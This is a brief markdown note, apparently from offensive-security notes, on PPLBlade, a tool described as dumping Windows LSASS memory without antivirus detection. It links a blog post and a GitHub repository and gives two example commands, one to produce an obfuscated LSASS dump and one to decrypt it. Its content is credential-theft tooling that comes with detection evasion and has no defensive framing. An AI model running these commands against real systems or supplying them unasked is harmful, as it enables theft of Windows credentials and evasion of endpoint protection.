# PPLBlade

## Dump LSASS without AV detection with PPLBlade

## Link: https://tacticaladversary.io/adversary-tactics/bypass-defender-and-ppl-protection-to-dump-lsass/?s=08

## Github repo: https://github.com/tastypepperoni/PPLBlade

### Example Usage:

#### 1) Dump obfuscated dump file

    PPLBlade.exe --mode dothatlsassthing --obfuscate 
    
#### 2) Deobfuscate dump file

    PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade 

### For more details, consult the github repository for more.
